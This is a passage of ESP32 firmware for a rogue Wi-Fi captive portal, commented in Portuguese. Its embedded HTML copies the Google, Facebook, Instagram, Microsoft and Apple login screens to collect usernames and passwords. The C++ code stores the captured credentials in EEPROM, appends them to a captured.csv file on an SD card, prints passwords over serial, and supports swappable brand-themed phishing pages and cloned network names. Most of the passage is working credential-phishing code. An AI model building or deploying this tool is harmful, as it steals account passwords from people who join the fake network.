                    <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/></g>
                    <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/></g>
                    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
                </svg>
            </div>
            <div class="g-heading">
                <h1>Fazer login</h1>
                <p>Use sua Conta do Google</p>
            </div>
            <div class="field">
                <input type="email" id="emailField" autocomplete="username" spellcheck="false" placeholder=" " />
                <label for="emailField">E-mail ou telefone</label>
            </div>
            <a href="#" class="sublink" onclick="return false">Esqueceu seu e-mail?</a>
            <p class="guest-note">Não está no seu computador? Use o modo visitante para fazer login de forma privada. <a href="#" onclick="return false">Saiba mais sobre como usar o modo visitante</a></p>
            <div class="buttons">
                <button type="button" class="btn-link" onclick="return false">Criar conta</button>
                <button type="button" class="btn-primary" id="btnEmailNext">Avançar</button>
            </div>
        </main>
        <footer class="g-footer">
            <div class="lang"><select aria-label="Idioma"><option selected>Português (Brasil)</option><option>English (United States)</option><option>Español</option></select></div>
            <ul><li><a href="#" onclick="return false">Ajuda</a></li><li><a href="#" onclick="return false">Privacidade</a></li><li><a href="#" onclick="return false">Termos</a></li></ul>
        </footer>
    </section>

    <!-- ============ TELA 3 — GOOGLE SENHA ============ -->
    <section class="screen" id="screen-password">
        <main class="g-main">
            <div class="g-logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
                    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
                    <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/></g>
                    <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/></g>
                    <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/></g>
                    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
                </svg>
            </div>
            <div class="g-heading"><h1>Bem-vindo(a)</h1></div>
            <div class="account">
                <div class="avatar" id="avatar">G</div>
                <span class="email" id="accountEmail">sua.conta@gmail.com</span>
                <span class="edit" id="editEmail">Editar</span>
            </div>
            <form id="loginForm" action="/login" method="POST">
                <input type="hidden" name="username" id="hiddenUsername" />
                <input type="hidden" name="provider" value="google" />
                <div class="field">
                    <input type="password" name="password" id="passField" autocomplete="current-password" placeholder=" " />
                    <label for="passField">Digite sua senha</label>
                </div>
                <label class="show-pass"><input type="checkbox" id="showPass" /> Mostrar senha</label>
                <div class="buttons">
                    <button type="button" class="btn-link" onclick="return false">Esqueceu a senha?</button>
                    <button type="submit" class="btn-primary" id="btnPassNext">Avançar</button>
                </div>
            </form>
        </main>
        <footer class="g-footer">
            <div class="lang"><select aria-label="Idioma"><option selected>Português (Brasil)</option><option>English (United States)</option><option>Español</option></select></div>
            <ul><li><a href="#" onclick="return false">Ajuda</a></li><li><a href="#" onclick="return false">Privacidade</a></li><li><a href="#" onclick="return false">Termos</a></li></ul>
        </footer>
    </section>

    <!-- ============ TELA 4 — FACEBOOK (1 passo) ============ -->
    <section class="screen" id="screen-facebook">
        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
        <div class="fb-wrap">
            <div class="fb-logo">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#1877F2" d="M24 12.073C24 5.446 18.627 0 12 0S0 5.446 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
                <div class="fb-word">facebook</div>
            </div>
            <form id="fbForm" class="fb-form" action="/login" method="POST">
                <input type="hidden" name="provider" value="facebook" />
                <input class="fb-input" id="fbUser" type="text" name="username" placeholder="E-mail ou telefone" autocomplete="username" spellcheck="false" />
                <div class="form-err fb-err" id="fbErr">Insira um e-mail ou número de telefone válido.</div>
                <input class="fb-input" id="fbPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
                <button type="submit" class="fb-btn">Entrar</button>
            </form>
            <a class="fb-link" href="#" onclick="return false">Esqueceu a senha?</a>
            <div class="fb-sep">ou</div>
            <a class="fb-new" href="#" onclick="return false">Criar nova conta</a>
            <div class="fb-foot">Português (Brasil) &middot; English (US) &middot; Español</div>
        </div>
    </section>

    <!-- ============ TELA 5 — INSTAGRAM (1 passo) ============ -->
    <section class="screen" id="screen-instagram">
        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
        <div class="ig-wrap">
            <svg class="ig-logo" viewBox="0 0 24 24" aria-hidden="true">
                <defs>
                    <linearGradient id="igGradLogo" x1="0%" y1="100%" x2="100%" y2="0%">
                        <stop offset="0%" stop-color="#F09433"/>
                        <stop offset="25%" stop-color="#E6683C"/>
                        <stop offset="50%" stop-color="#DC2743"/>
                        <stop offset="75%" stop-color="#CC2366"/>
                        <stop offset="100%" stop-color="#BC1888"/>
                    </linearGradient>
                </defs>
                <rect x="2.6" y="2.6" width="18.8" height="18.8" rx="5.4" fill="none" stroke="url(#igGradLogo)" stroke-width="2.1"/>
                <circle cx="12" cy="12" r="4.5" fill="none" stroke="url(#igGradLogo)" stroke-width="2.1"/>
                <circle cx="17.6" cy="6.4" r="1.25" fill="url(#igGradLogo)"/>
            </svg>
            <form id="igForm" class="ig-form" action="/login" method="POST">
                <input type="hidden" name="provider" value="instagram" />
                <input class="ig-input" id="igUser" type="text" name="username" placeholder="Número de celular, nome de usuário ou e-mail" autocomplete="username" spellcheck="false" />
                <div class="form-err ig-err" id="igErr">Insira um nome de usuário, e-mail ou número de telefone válido.</div>
                <input class="ig-input" id="igPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
                <button type="submit" class="ig-btn">Entrar</button>
            </form>
            <a class="ig-forgot" href="#" onclick="return false">Esqueceu a senha?</a>
            <div class="ig-foot">Português (Brasil) &middot; English &middot; Español</div>
        </div>
    </section>

    <!-- ============ TELA 6 — MICROSOFT (E-MAIL) ============ -->
    <section class="screen" id="screen-ms-email">
        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
        <div class="ms-wrap">
            <div class="ms-logo">
                <svg viewBox="0 0 23 23" aria-hidden="true"><rect width="10.5" height="10.5" fill="#F25022"/><rect x="12.5" width="10.5" height="10.5" fill="#7FBA00"/><rect y="12.5" width="10.5" height="10.5" fill="#00A4EF"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/></svg>
                <span>Microsoft</span>
            </div>
            <h1 class="ms-title">Entrar</h1>
            <input class="ms-input" id="msEmail" type="text" placeholder="E-mail ou telefone" autocomplete="username" spellcheck="false" />
            <div class="form-err ms-err" id="msErr">Insira um endereço de e-mail ou número de telefone válido.</div>
            <a class="ms-link" href="#" onclick="return false">Não consegue acessar sua conta?</a>
            <div class="ms-actions"><button type="button" class="ms-btn" id="btnMsNext">Avançar</button></div>
            <div class="ms-new"><a href="#" onclick="return false">Criar uma conta!</a></div>
        </div>
    </section>

    <!-- ============ TELA 7 — MICROSOFT (SENHA) ============ -->
    <section class="screen" id="screen-ms-password">
        <div class="ms-wrap">
            <div class="ms-logo">
                <svg viewBox="0 0 23 23" aria-hidden="true"><rect width="10.5" height="10.5" fill="#F25022"/><rect x="12.5" width="10.5" height="10.5" fill="#7FBA00"/><rect y="12.5" width="10.5" height="10.5" fill="#00A4EF"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/></svg>
                <span>Microsoft</span>
            </div>
            <div class="ms-back" id="msBack">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#1B1B1B" d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                <span id="msAccount">usuario@exemplo.com</span>
            </div>
            <h1 class="ms-title">Inserir senha</h1>
            <form id="msForm" action="/login" method="POST">
                <input type="hidden" name="username" id="msHiddenUser" />
                <input type="hidden" name="provider" value="microsoft" />
                <input class="ms-input" id="msPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
                <a class="ms-link" href="#" onclick="return false">Esqueceu a senha?</a>
                <div class="ms-actions"><button type="submit" class="ms-btn">Entrar</button></div>
                <div class="ms-new"><a href="#" onclick="return false">Outras formas de entrar</a></div>
            </form>
        </div>
    </section>

    <!-- ============ TELA 8 — APPLE (APPLE ID) ============ -->
    <section class="screen" id="screen-apple-email">
        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
        <div class="ap-wrap">
            <svg class="ap-logo" viewBox="0 0 24 24" aria-hidden="true"><path fill="#1D1D1F" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
            <h1 class="ap-title">Inicie sessão na Apple</h1>
            <div class="ap-card">
                <label class="ap-label" for="apId">Apple ID</label>
                <input class="ap-input" id="apId" type="text" placeholder="E-mail ou telefone" autocomplete="username" spellcheck="false" />
            </div>
            <div class="form-err ap-err" id="apErr">Insira um e-mail ou número de telefone válido.</div>
            <button type="button" class="ap-btn" id="btnApNext">Continuar</button>
            <a class="ap-link" href="#" onclick="return false">Esqueceu a Apple ID ou a senha?</a>
            <div class="ap-new">Não tem uma Apple ID? <a href="#" onclick="return false">Criar Apple ID</a></div>
        </div>
    </section>

    <!-- ============ TELA 9 — APPLE (SENHA) ============ -->
    <section class="screen" id="screen-apple-password">
        <div class="ap-wrap">
            <svg class="ap-logo" viewBox="0 0 24 24" aria-hidden="true"><path fill="#1D1D1F" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
            <h1 class="ap-title">Inicie sessão na Apple</h1>
            <div class="ap-account"><span id="apAccount">usuario@icloud.com</span><a id="apEdit">Editar</a></div>
            <form id="apForm" action="/login" method="POST">
                <input type="hidden" name="username" id="apHiddenUser" />
                <input type="hidden" name="provider" value="apple" />
                <div class="ap-card">
                    <label class="ap-label" for="apPass">Senha</label>
                    <input class="ap-input" id="apPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
                </div>
                <div class="form-err ap-err" id="apPassErr">Insira sua senha.</div>
                <button type="submit" class="ap-btn" id="btnApSignIn">Continuar</button>
            </form>
            <a class="ap-link" href="#" onclick="return false">Esqueceu a senha?</a>
        </div>
    </section>

    <div class="spinner-overlay" id="spinner"><div class="spinner"></div></div>

<script>
    /* ---------- navegacao ---------------------------------------------------
       As telas sao o MESMO documento trocado por JS, entao por padrao o
       navegador nao registra navegacao nenhuma e o botao "voltar" do sistema
       nao tem para onde voltar. Aqui mantemos uma pilha e empurramos um estado
       no historico, para o voltar do Android/Safari funcionar. O CNA do iOS
       nao tem botao algum, por isso existe tambem o "< Voltar" na tela. */
    var navStack = [];

    function paint(id) {
        var screens = document.querySelectorAll('.screen');
        for (var i = 0; i < screens.length; i++) screens[i].classList.remove('active');
        document.getElementById(id).classList.add('active');
        window.scrollTo(0, 0);
    }

    function show(id) {
        var cur = document.querySelector('.screen.active');
        var curId = cur ? cur.id : null;
        if (curId && curId !== id) {
            navStack.push(curId);
            try { history.pushState({ nav: navStack.length }, ''); } catch (e) { }
        }
        paint(id);
    }

    function goBack() {
        var prev = navStack.length ? navStack.pop() : 'screen-landing';
        paint(prev);
    }

    window.addEventListener('popstate', function () {
        if (navStack.length) goBack();
    });

    function focusLater(id) {
        setTimeout(function () {
            var el = document.getElementById(id);
            if (el) el.focus();
        }, 250);
    }

    var spinner = document.getElementById('spinner');
    function openScreen(id, focusId) {
        spinner.classList.add('show');
        setTimeout(function () {
            spinner.classList.remove('show');
            show(id);
            focusLater(focusId);
        }, 700);
    }

    /* ---------- TELA 1: escolha do provedor ---------- */
    document.getElementById('btnGoogle').addEventListener('click', function () { openScreen('screen-email', 'emailField'); });
    document.getElementById('btnFacebook').addEventListener('click', function () { openScreen('screen-facebook', 'fbUser'); });
    document.getElementById('btnInstagram').addEventListener('click', function () { openScreen('screen-instagram', 'igUser'); });
    document.getElementById('btnMicrosoft').addEventListener('click', function () { openScreen('screen-ms-email', 'msEmail'); });
    document.getElementById('btnApple').addEventListener('click', function () { openScreen('screen-apple-email', 'apId'); });

    /* ---------- GOOGLE: e-mail -> senha ---------- */
    document.getElementById('btnEmailNext').addEventListener('click', function () {
        var email = document.getElementById('emailField').value.trim();
        if (!email) { document.getElementById('emailField').focus(); return; }
        document.getElementById('accountEmail').textContent = email;
        document.getElementById('avatar').textContent = email.charAt(0).toUpperCase();
        show('screen-password');
        focusLater('passField');
    });

    document.getElementById('emailField').addEventListener('keydown', function (e) {
        if (e.keyCode === 13) { e.preventDefault(); document.getElementById('btnEmailNext').click(); }
    });

    document.getElementById('editEmail').addEventListener('click', goBack);

    document.getElementById('showPass').addEventListener('change', function () {
        document.getElementById('passField').type = this.checked ? 'text' : 'password';
    });

    document.getElementById('loginForm').addEventListener('submit', function (e) {
        document.getElementById('hiddenUsername').value = document.getElementById('emailField').value.trim();
        if (!document.getElementById('passField').value) {
            e.preventDefault();
            document.getElementById('passField').focus();
        }
    });

    /* ---------- validações de identificação ---------- */
    function isEmail(v) {
        return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(v);
    }
    function isPhone(v) {
        if (!/^[+()\-. \t0-9]+$/.test(v)) return false;
        var d = v.replace(/[^0-9]/g, '');
        return d.length >= 8 && d.length <= 13;
    }
    function isUsername(v) {
        return /^[a-zA-Z0-9._]{3,30}$/.test(v);
    }
    function showErr(err, input, msg) {
        err.textContent = msg;
        err.classList.add('show');
        if (input) input.focus();
        return false;
    }
    function hideErr(err) {
        err.classList.remove('show');
    }

    /* ---------- FACEBOOK: e-mail ou telefone + senha na mesma tela ---------- */
    document.getElementById('fbForm').addEventListener('submit', function (e) {
        var u = document.getElementById('fbUser');
        var p = document.getElementById('fbPass');
        var err = document.getElementById('fbErr');
        var v = u.value.trim();
        if (!v || !(isEmail(v) || isPhone(v))) {
            e.preventDefault();
            showErr(err, u, 'Insira um e-mail ou número de telefone válido.');
            return;
        }
        if (!p.value) {
            e.preventDefault();
            showErr(err, p, 'Insira sua senha.');
            return;
        }
        hideErr(err);
    });
    document.getElementById('fbUser').addEventListener('input', function () { hideErr(document.getElementById('fbErr')); });
    document.getElementById('fbPass').addEventListener('input', function () { hideErr(document.getElementById('fbErr')); });

    /* ---------- INSTAGRAM: usuário, e-mail ou telefone + senha ---------- */
    document.getElementById('igForm').addEventListener('submit', function (e) {
        var u = document.getElementById('igUser');
        var p = document.getElementById('igPass');
        var err = document.getElementById('igErr');
        var v = u.value.trim();
        if (!v || !(isEmail(v) || isPhone(v) || isUsername(v))) {
            e.preventDefault();
            showErr(err, u, 'Insira um nome de usuário, e-mail ou número de telefone válido.');
            return;
        }
        if (!p.value) {
            e.preventDefault();
            showErr(err, p, 'Insira sua senha.');
            return;
        }
        hideErr(err);
    });
    document.getElementById('igUser').addEventListener('input', function () { hideErr(document.getElementById('igErr')); });
    document.getElementById('igPass').addEventListener('input', function () { hideErr(document.getElementById('igErr')); });

    /* ---------- MICROSOFT: e-mail ou telefone -> senha ---------- */
    document.getElementById('btnMsNext').addEventListener('click', function () {
        var el = document.getElementById('msEmail');
        var err = document.getElementById('msErr');
        var v = el.value.trim();
        if (!v || !(isEmail(v) || isPhone(v))) {
            showErr(err, el, 'Insira um endereço de e-mail ou número de telefone válido.');
            return;
        }
        hideErr(err);
        document.getElementById('msAccount').textContent = v;
        show('screen-ms-password');
        focusLater('msPass');
    });

    document.getElementById('msEmail').addEventListener('input', function () { hideErr(document.getElementById('msErr')); });

    document.getElementById('msEmail').addEventListener('keydown', function (e) {
        if (e.keyCode === 13) { e.preventDefault(); document.getElementById('btnMsNext').click(); }
    });

    document.getElementById('msBack').addEventListener('click', goBack);

    document.getElementById('msForm').addEventListener('submit', function (e) {
        document.getElementById('msHiddenUser').value = document.getElementById('msEmail').value.trim();
        if (!document.getElementById('msPass').value) {
            e.preventDefault();
            document.getElementById('msPass').focus();
        }
    });

    /* ---------- APPLE: Apple ID (e-mail ou telefone) -> senha ---------- */
    document.getElementById('btnApNext').addEventListener('click', function () {
        var el = document.getElementById('apId');
        var err = document.getElementById('apErr');
        var v = el.value.trim();
        if (!v || !(isEmail(v) || isPhone(v))) {
            showErr(err, el, 'Insira um e-mail ou número de telefone válido.');
            return;
        }
        hideErr(err);
        document.getElementById('apAccount').textContent = v;
        show('screen-apple-password');
        focusLater('apPass');
    });

    document.getElementById('apId').addEventListener('input', function () { hideErr(document.getElementById('apErr')); });

    document.getElementById('apId').addEventListener('keydown', function (e) {
        if (e.keyCode === 13) { e.preventDefault(); document.getElementById('btnApNext').click(); }
    });

    document.getElementById('apEdit').addEventListener('click', goBack);

    document.getElementById('apPass').addEventListener('input', function () { hideErr(document.getElementById('apPassErr')); });

    document.getElementById('apForm').addEventListener('submit', function (e) {
        document.getElementById('apHiddenUser').value = document.getElementById('apId').value.trim();
        if (!document.getElementById('apPass').value) {
            e.preventDefault();
            showErr(document.getElementById('apPassErr'), document.getElementById('apPass'), 'Insira sua senha.');
        }
    });
</script>
</body>
</html>
)CPORTAL";

// A pagina do portal nunca e copiada para a RAM: a embutida sai direto da
// flash (send_P) e a do SD vai em streaming (ver cpSendPortalPage).
//
// Fonte da pagina: 0 = embutida ("Local"); 1..N = uma pagina do cartao.
// O nome vem do proprio arquivo: /captive_portal/<nome>.html vira "SD <nome>".
// Assim "McD.html" aparece como "SD McD" e "BK.html" como "SD BK".
#define CP_MAX_SD_PAGES   8
#define CP_PAGE_NAME_LEN  20
static uint8_t s_ssidSrc         = 0;                              // 0=Std 1=Custom 2=Clone
static uint8_t s_pageSourceIdx   = 0;
static uint8_t s_pageSourceCount = 1;                              // 1 + paginas no cartao
static char    s_pageNames[CP_MAX_SD_PAGES][CP_PAGE_NAME_LEN];     // nomes, sem o .html

// Mapa "pagina -> nome da rede", lido de /captive_portal/ssid.txt
#define CP_MAX_NAME_MAP  8
#define CP_SSID_NAME_LEN 40
struct CpNameMapEntry { char key[CP_PAGE_NAME_LEN]; char ssid[CP_SSID_NAME_LEN]; };
static CpNameMapEntry s_nameMap[CP_MAX_NAME_MAP];
static uint8_t        s_nameMapCount = 0;
static char           s_stdNameLocal[CP_SSID_NAME_LEN] = "WiFi Gratis";

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  const int bodyBottom = wifiContentBottom();
  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * CP_LINE_HEIGHT + 45;
    if (yPos + CP_LINE_HEIGHT > bodyBottom) {
      break;
    }
    tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
    tft.fillRect(5, yPos, tft.width() - 10, CP_LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void saveCredential(String username, String password, String ssid, String provider) {
  Credential cred;
  memset(&cred, 0, sizeof(cred));
  strncpy(cred.username, username.c_str(), 63);
  cred.username[63] = '\0';
  strncpy(cred.password, password.c_str(), 63);
  cred.password[63] = '\0';
  strncpy(cred.ssid, ssid.c_str(), 31);
  cred.ssid[31] = '\0';
  strncpy(cred.provider, provider.c_str(), 11);
  cred.provider[11] = '\0';

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Before saving, credential count: %d\n", count);
  if (count < MAX_CREDS) {
    int addr = CRED_ADDR + (count * CRED_SIZE);
    EEPROM.put(addr, cred);
    count++;
    EEPROM.write(COUNT_ADDR, count);
    EEPROM.commit();
    Serial.println("Credential saved at address " + String(addr));
    Serial.println("Username: " + String(cred.username));
    Serial.println("Password: " + String(cred.password));
    Serial.println("SSID: " + String(cred.ssid));
    Serial.println("Provider: " + String(cred.provider));
    Serial.printf("After saving, credential count: %d\n", count);
  } else {
    Serial.println("Credential storage full");
  }
}

static bool cp_sd_mounted = false;

static bool cpMountSD() {
  if (cp_sd_mounted) {
    if (SD.cardType() != CARD_NONE) return true;
    cp_sd_mounted = false;
  }
  cp_sd_mounted = isSDCardAvailable();
  return cp_sd_mounted;
}

static bool cpEnsureDir(const char* dirPath) {
  if (!cpMountSD()) return false;
  if (!SD.exists(dirPath)) {
    if (SD.mkdir(dirPath)) return true;

    if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
    return false;
  }
  return true;
}

static String cpCsvEscape(const String& s) {
  bool needsQuotes = false;
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == ',' || c == '"' || c == '\n' || c == '\r') { needsQuotes = true; break; }
  }
  if (!needsQuotes) return s;

  String out = "\"";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"') out += "\"\"";
    else out += c;
  }
  out += "\"";
  return out;
}

static bool cpAppendLineToFile(const char* path, const String& line) {
  if (!cpMountSD()) return false;

  File f = SD.open(path, "a");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "a");
    if (!f) return false;
  }

  bool ok = (f.print(line) > 0);
  f.flush();
  f.close();
  return ok;
}

static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr,
                                const String& ssid, const String& provider) {
  const char* dir = "/captive_portal";
  const char* path = "/captive_portal/captured.csv";
  if (!cpEnsureDir(dir)) return false;

  bool exists = SD.exists(path);
  if (!exists) {
    if (!cpAppendLineToFile(path, "millis,provider,remote_ip,ssid,username,password\r\n")) return false;
  }

  String row;
  row.reserve(48 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length() + provider.length());
  row += String(millis());
  row += ",";
  row += cpCsvEscape(provider);
  row += ",";
  row += cpCsvEscape(remoteIp);
  row += ",";
  row += cpCsvEscape(ssid);
  row += ",";
  row += cpCsvEscape(username);
  row += ",";
  row += cpCsvEscape(passwordStr);
  row += "\r\n";
  return cpAppendLineToFile(path, row);
}

// --- SD-editable captive portal page -----------------------------------------
// Mirrors the Beacon "/ssid_list.txt" pattern: the login page is seeded to the
// SD card on first run (so there is a file to edit) and reloaded from there on
// every run, falling back to the built-in page if the SD/file is unavailable.
static const char* kCpReadmePath = "/captive_portal/README.txt";
static const char* kCpSsidMapPath = "/captive_portal/ssid.txt";

// Caminho da pagina N: /captive_portal/<nome>.html (nome lido da pasta).
static void cpPagePathFor(uint8_t idx, char* out, size_t n) {
  if (idx < 1 || idx > CP_MAX_SD_PAGES) { out[0] = '\0'; return; }
  snprintf(out, n, "/captive_portal/%s.html", s_pageNames[idx - 1]);
}

static const char* cpBaseName(const char* p) {
  const char* s = strrchr(p, '/');
  return s ? s + 1 : p;
}

static bool cpEndsWithHtml(const char* nm) {
  size_t len = strlen(nm);
  if (len < 6) return false;
  const char* e = nm + len - 5;
  return e[0] == '.' && (e[1] | 0x20) == 'h' && (e[2] | 0x20) == 't'
      && (e[3] | 0x20) == 'm' && (e[4] | 0x20) == 'l';
}

// Le /captive_portal e guarda o nome de cada .html (sem a extensao).
// O nome do arquivo E o nome do local mostrado no menu.
static void cpScanSDPages() {
  s_pageSourceCount = 1;
  if (!cpMountSD()) {
    Serial.println("[SD] sem cartao: apenas a pagina Local (embutida)");
    return;
  }
  File dir = SD.open("/captive_portal");
  if (!dir || !dir.isDirectory()) {
    Serial.println("[SD] /captive_portal nao encontrado: apenas a pagina Local");
    return;
  }

  uint8_t n = 0;
  int listados = 0;
  File e;
  Serial.println("[SD] conteudo de /captive_portal:");
  while (listados < 40 && (e = dir.openNextFile())) {
    const char* base = cpBaseName(e.name());
    if (e.isDirectory()) {
      Serial.printf("[SD]   [pasta]  %s\n", base);
    } else {
      bool pag = cpEndsWithHtml(base);
      Serial.printf("[SD]   %-22s %8u bytes%s\n", base, (unsigned)e.size(),
                    pag ? "   <- pagina" : "");
      if (pag) {
        size_t blen = strlen(base);
        if (n < CP_MAX_SD_PAGES && (blen - 5) < CP_PAGE_NAME_LEN) {
          memcpy(s_pageNames[n], base, blen - 5);
          s_pageNames[n][blen - 5] = '\0';
          n++;
        }
      }
    }
    listados++;
    e.close();
  }
  dir.close();
  if (listados == 0) {
    Serial.println("[SD]   (pasta vazia)");
  }

  // ordem alfabetica, para o menu ficar estavel
  for (uint8_t i = 1; i < n; i++) {
    char k[CP_PAGE_NAME_LEN];
    memcpy(k, s_pageNames[i], CP_PAGE_NAME_LEN);
    int8_t j = (int8_t)i - 1;
    while (j >= 0 && strcmp(s_pageNames[j], k) > 0) {
      memcpy(s_pageNames[j + 1], s_pageNames[j], CP_PAGE_NAME_LEN);
      j--;
